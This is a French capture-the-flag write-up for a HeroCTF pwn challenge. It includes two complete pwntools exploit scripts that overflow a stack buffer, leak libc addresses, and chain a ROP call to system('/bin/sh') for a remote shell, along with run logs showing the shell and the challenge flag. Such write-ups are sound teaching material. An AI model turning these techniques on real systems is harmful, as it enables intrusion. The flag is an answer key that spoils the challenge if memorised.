# Fonce pas dans le tas

### Catégorie
Pwn

### Description
L'organisateur est furieux... Vous l'avez eu à chaque fois...
Il a refait pour une ultime fois son programme et est prêt à parier ce qu'il veut que vous n'arriverez pas à l'exploiter.
Prêt à relever le défi ?

libc : http://challs.heroctf.fr:10000/libc-2.27.so

Accès au challenge : nc challs.heroctf.fr 7003

Format : Hero{flag}

### Auteur
SoEasY & Worty

### Fichiers
- Binaire executé par le service : BOO_4
- libc : libc-2.27.so

### Solution
// TODO

Voici deux exemmples de scripts utilisant pwntools : 
- en python2
```python
#!/usr/bin/python
from pwn import *

elf = ELF('./BOO_4')
libc = ELF('./libc-2.27.so')

r = remote('challs.heroctf.fr', 7003)
r.recv()

puts_got = elf.got['puts']
puts_plt = elf.sym['puts']
vuln = elf.sym['vuln']

pop1_ret = 0x0804901e

pld = "A"*268
pld += p32(puts_plt)
pld += p32(pop1_ret)
pld += p32(puts_got)
pld += p32(vuln)

r.sendline(pld)

leak = u32(r.recv().splitlines()[3])
libc_base = leak - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search('/bin/sh')) 

log.success('libc base is @ %s' % hex(libc_base))

pld = "A"*268
pld += p32(system_addr)
pld += p32(0)
pld += p32(binsh_addr)

r.sendline(pld)
r.recv()
log.success("Enjoy your shell :)")
r.interactive()
```
Exécution : 
```bash
$ python exploit_rop.py 
[*] '/root/Bureau/BOO_4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/root/Bureau/libc-2.27.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challs.heroctf.fr on port 7003: Done
[+] libc base is @ 0xf7dd3000
[+] Enjoy your shell :)
[*] Switching to interactive mode
$ ls -al
total 32
drwxr-xr-x 1 pwnflag pwnflag  4096 Nov 14 17:26 .
drwxr-xr-x 1 root    root     4096 Nov 14 20:38 ..
-rwsr-xr-x 1 pwnflag pwnflag 15648 Nov 14 16:39 chall
-rwsr-xr-x 1 root    root      116 Nov 14 17:18 entry.sh
-rw-r--r-- 1 root    root       28 Nov 14 16:40 flag.txt
$ cat flag.txt
Hero{34sy_r0p_ch4ll3ng3_!!}
$ 
[*] Interrupted
[*] Closed connection to challs.heroctf.fr port 7003
```
- en python3
```python
#!/usr/bin/env python3
from pwn import *

r = remote("challs.heroctf.fr",7003)
libc = ELF('./libc-2.27.so')

r.recvuntil("!\n")
log.success("Preparing payload...")

pop_ebp_ret = 0x0804931b

payload  = b"A"*264 # buffer + alignement
payload += b"A"*4  # saved EBP
payload += p32(0x08049060) # puts@PLT
payload += p32(pop_ebp_ret) # pop ebp; ret
payload += p32(0x0804c02c) # strtok@GOT
payload += p32(0x080491d2) # ret2sym.vuln
payload += b"\n"

r.send(payload)
log.success('Payload Sent !')

answer = r.recvuntil(b"!\n")
leak_strtok = u32(answer.split(b"\n")[4])

log.success(f"LIBC leak : strtok() -> {hex(leak_strtok)}")

leak_system = leak_strtok - libc.symbols["strtok"] + libc.symbols["system"]
leak_binsh  = leak_strtok - libc.symbols["strtok"] + next(libc.search(b"/bin/sh\x00"))

log.success(f"LIBC leak : system() -> {hex(leak_system)}")
log.success(f"LIBC leak : '/bin/sh\\x00' -> {hex(leak_binsh)}")
log.success("Building final payload...")

payload  = b"A"*264 # buffer + alignement
payload += b"A"*4  # saved EBP
payload += p32(leak_system) # jump to system()
payload += p32(pop_ebp_ret)  # pop ebp; ret
payload += p32(leak_binsh)  # '/bin/sh\x00'
payload += b"\n"

log.success("Sending payload")
r.send(payload)
log.success("Enjoy your shell :)")
r.interactive()
```
Exécution : 
```bash
$ python3 exploit_rop.py 
[+] Opening connection to challs.heroctf.fr on port 7003: Done
[*] '/root/Bureau/libc-2.27.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Preparing payload...
[+] Payload Sent !
[+] LIBC leak : strtok() -> 0xf7ddd710
[+] LIBC leak : system() -> 0xf7d9b2e0
[+] LIBC leak : '/bin/sh\x00' -> 0xf7edc0af
[+] Building final payload...
[+] Sending payload
[+] Enjoy your shell :)
[*] Switching to interactive mode

Voici ton nombre aléatoire jeune AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe0\xb2\xd9\xf7x9\xaf\xc0\xed\xf7 : 1605349517
#TODO : renvoyer un nombre vraiment VRAIMENT aléatoire...

$ ls -al
total 32
drwxr-xr-x 1 pwnflag pwnflag  4096 Nov 14 17:26 .
drwxr-xr-x 1 root    root     4096 Nov 14 20:38 ..
-rwsr-xr-x 1 pwnflag pwnflag 15648 Nov 14 16:39 chall
-rwsr-xr-x 1 root    root      116 Nov 14 17:18 entry.sh
-rw-r--r-- 1 root    root       28 Nov 14 16:40 flag.txt
$ cat flag.txt
Hero{34sy_r0p_ch4ll3ng3_!!}
$ 
[*] Interrupted
```
### Flag
Hero{34sy_r0p_ch4ll3ng3_!!}
